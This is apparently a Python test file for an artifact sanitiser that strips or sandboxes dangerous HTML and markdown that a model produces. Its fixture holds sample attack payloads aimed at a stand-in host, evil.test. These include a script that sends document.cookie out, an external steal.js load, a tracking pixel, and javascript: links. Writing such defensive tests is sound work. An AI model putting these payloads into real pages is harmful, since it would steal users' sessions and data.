"""Artifact sanitiser.

Written against the payloads a model actually produces plus the ones an attacker
would try. The layering matters: inline scripts are expected to SURVIVE this
module (the sandbox contains them), so a test asserting they're stripped would
be asserting the wrong design.
"""
from app.security.sanitize import CSP, POLICY, SANDBOX, sanitize_html, sanitize_markdown

EXFIL = """<html><head><link rel="stylesheet" href="//evil.test/x.css"></head><body>
<h1>Growth plan</h1>
<script src="https://evil.test/steal.js"></script>
<script>fetch("https://evil.test/?c="+document.cookie)</script>
<img src="https://tracker.test/pixel.gif">
<iframe src="https://evil.test"></iframe>
<form action="https://evil.test"><input name="q"></form>
<a href="javascript:alert(1)" target="_top">click</a>
</body></html>"""


def test_exfil_payload_is_defanged():
    out, rep = sanitize_html(EXFIL)
    rules = {b["rule"] for b in rep.blocked}
    assert {"external-script", "external-stylesheet", "iframe-tag",
            "form-tag", "js-url", "target-top", "remote-resource"} <= rules
    assert "evil.test/steal.js" not in out
    assert "tracker.test" not in out
    assert "<iframe" not in out.lower()


def test_inline_script_survives_because_the_sandbox_contains_it():
    out, _ = sanitize_html(EXFIL)
    assert "fetch(" in out          # not stripped...
    assert "default-src 'none'" in out  # ...but it cannot reach the network
    assert "allow-same-origin" not in SANDBOX  # ...and has no origin to read


def test_csp_is_injected_even_when_model_writes_its_own_head():
    out, _ = sanitize_html("<html><head><title>x</title></head><body>hi</body></html>")
    assert out.count("Content-Security-Policy") == 1
    assert CSP in out


def test_bare_fragment_gets_wrapped():
    out, _ = sanitize_html("<h1>hello</h1>")
    assert out.lower().startswith("<!doctype html>")
    assert "Content-Security-Policy" in out


def test_data_uri_image_is_kept():
    out, rep = sanitize_html('<img src="data:image/png;base64,iVBORw0KGgo=">')
    assert "data:image/png" in out
    assert not [b for b in rep.blocked if b["rule"] == "remote-resource"]


def test_base_tag_removed():
    out, rep = sanitize_html('<base href="https://evil.test/"><p>x</p>')
    assert "<base" not in out.lower()
    assert any(b["rule"] == "base-tag" for b in rep.blocked)


def test_markdown_strips_inline_html_and_js_links():
    out, rep = sanitize_markdown(
        '# Title\n<script>x()</script>\n[a](javascript:alert(1))\n<div onclick="y">z</div>'
    )
    rules = {b["rule"] for b in rep.blocked}
    assert {"script-tag", "js-link", "event-handler"} <= rules
    assert "javascript:" not in out
    assert "](#blocked)" in out
    assert "onclick" not in out


def test_clean_content_reports_nothing_blocked():
    _, rep = sanitize_html("<h1>Quarterly plan</h1><p>Nothing dangerous here.</p>")
    assert rep.blocked == []


def test_policy_endpoint_payload_matches_enforcement():
    # The docs can't drift from the code if they're generated from it.
    assert POLICY["csp"] == CSP
    assert POLICY["sandbox"] == SANDBOX
